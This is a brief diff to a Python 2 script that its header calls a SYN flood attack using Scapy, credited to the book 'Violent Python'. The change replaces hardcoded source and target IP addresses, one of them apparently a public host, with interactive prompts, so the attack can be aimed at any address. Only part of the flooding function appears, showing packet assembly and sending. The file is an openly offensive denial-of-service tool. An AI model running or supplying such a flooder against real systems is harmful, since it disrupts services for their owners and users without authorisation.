@@ -1,4 +1,3 @@
-
 #!/usr/bin/env python2
 # written by Moses Arocha
 # Created in Python, it is a SYN Flood Attack that uses the library Scapy, created wit the help of TJ O'Connor "Violent Python"
@@ -12,7 +11,7 @@ def synFlood(src, tgt):
 		pkt = IPlayer / TCPlayer
 		send(pkt)
 
-src = "192.168.0.9"
-tgt = "67.11.63.163"
+src = raw_input("\n\n\t What is the Source IP Address : ")
+tgt = raw_input("\n\n\t What is the Destination IP Address : ")
 
 synFlood(src, tgt)
